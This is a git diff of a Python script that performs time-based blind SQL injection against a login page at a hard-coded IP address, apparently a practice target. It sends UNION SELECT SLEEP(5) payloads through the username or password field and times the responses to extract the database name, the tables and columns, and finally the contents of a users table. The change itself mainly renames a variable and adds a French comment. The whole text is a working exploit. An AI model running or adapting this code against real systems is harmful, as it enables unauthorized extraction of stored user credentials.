@@ -10,6 +10,7 @@ def db_name():
     table = ""
     global url
     url = "http://51.15.136.118/login_sqlmap.php"
+    # sert à déterminer si c'est username qui est vulnérable ou password
     global vulnerable_input
     vulnerable_input = True
     
@@ -22,9 +23,9 @@ def db_name():
     for letter in dictionary:
         for num in range(1, 10):
             nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
-            passwd = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+            payload = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
             start_time = time.time()
-            response = requests.post(url, data={'username': usr, 'password': passwd})
+            response = requests.post(url, data={'username': usr, 'password': payload})
             end_time = time.time()
             total_time = end_time - start_time
             if total_time >= TIME:
@@ -37,9 +38,9 @@ def db_name():
         for letter in dictionary:
             for num in range(1, 10):
                 nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
-                passwd = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
+                payload = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
                 start_time = time.time()
-                response = requests.post(url, data={'username': passwd, 'password': usr})
+                response = requests.post(url, data={'username': payload, 'password': usr})
                 end_time = time.time()
                 total_time = end_time - start_time
                 if total_time >= TIME:
@@ -59,12 +60,12 @@ def db_name():
     # Use the name of the database to find the names of the tables
     for i in range(1, 20):
         for j in range(0, len(dictionary)):
-            passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
+            payload = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
             start_time = time.time()
             if vulnerable_input == False:   
-                response = requests.post(url, data={'username': passwd, 'password': usr})
+                response = requests.post(url, data={'username': payload, 'password': usr})
             else:
-                response = requests.post(url, data={'username': usr, 'password': passwd})
+                response = requests.post(url, data={'username': usr, 'password': payload})
             end_time = time.time()
             total_time = end_time - start_time
             a += 1
@@ -116,15 +117,15 @@ def table_name(database):
                     break
                 else:
                     break
-            passwd = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
-            """print(passwd)"""
+            payload = "' UNION SELECT SLEEP(5)" + table + " TABLE_NAME FROM information_schema.tables WHERE table_schema='" + database + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
+            """print(payload)"""
             
             # Measure the time it takes for the response
             start_time = time.time()
             if vulnerable_input == False:   
-                response = requests.post(url, data={'username': passwd, 'password': usr})
+                response = requests.post(url, data={'username': payload, 'password': usr})
             else:
-                response = requests.post(url, data={'username': usr, 'password': passwd})
+                response = requests.post(url, data={'username': usr, 'password': payload})
             end_time = time.time()
             total_time = end_time - start_time
             
@@ -176,15 +177,15 @@ def column_name(database, nom_table):
                     break
             
             # Requête SQL pour récupérer les noms de colonnes de la table cible
-            passwd = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
-            """print(passwd)"""
+            payload = "' UNION SELECT SLEEP(5)" + table + " COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + database + "' AND TABLE_NAME='" + nom_table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
+            """print(payload)"""
             
             # Envoi de la requête et mesure du temps de réponse
             start_time = time.time()
             if vulnerable_input == False:   
-                response = requests.post(url, data={'username': passwd, 'password': usr})
+                response = requests.post(url, data={'username': payload, 'password': usr})
             else:
-                response = requests.post(url, data={'username': usr, 'password': passwd})
+                response = requests.post(url, data={'username': usr, 'password': payload})
             end_time = time.time()
             total_time = end_time - start_time
             
@@ -231,11 +232,11 @@ def trouver_tab0(nom_table):
             # Mesure du temps d'exécution de la requête
             start_time = time.time()
             # Création de la requête SQL injectée avec le nom de table, le nom de colonne et les caractères testés
-            passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
+            payload = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM " + nom_table + " WHERE " + tab[0] + " like '" + texte + dictionary[j] + "%' -- "
             if vulnerable_input == False:   
-                response = requests.post(url, data={'username': passwd, 'password': usr})
+                response = requests.post(url, data={'username': payload, 'password': usr})
             else:
-                response = requests.post(url, data={'username': usr, 'password': passwd})
+                response = requests.post(url, data={'username': usr, 'password': payload})
             # Mesure du temps d'exécution de la requête
             end_time = time.time()
             total_time = end_time - start_time
@@ -300,13 +301,13 @@ def dump_columns(table, tab0, column_name):
 
                     start_time = time.time()
                     # Requête SQL injectée pour récupérer les données
-                    passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
-                    print(passwd)
+                    payload = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
+                    print(payload)
                     # Envoi de la requête HTTP
                     if vulnerable_input == False:   
-                        response = requests.post(url, data={'username': passwd, 'password': usr})
+                        response = requests.post(url, data={'username': payload, 'password': usr})
                     else:
-                        response = requests.post(url, data={'username': usr, 'password': passwd})
+                        response = requests.post(url, data={'username': usr, 'password': payload})
                     end_time = time.time()
                     total_time = end_time - start_time
                     a+=1
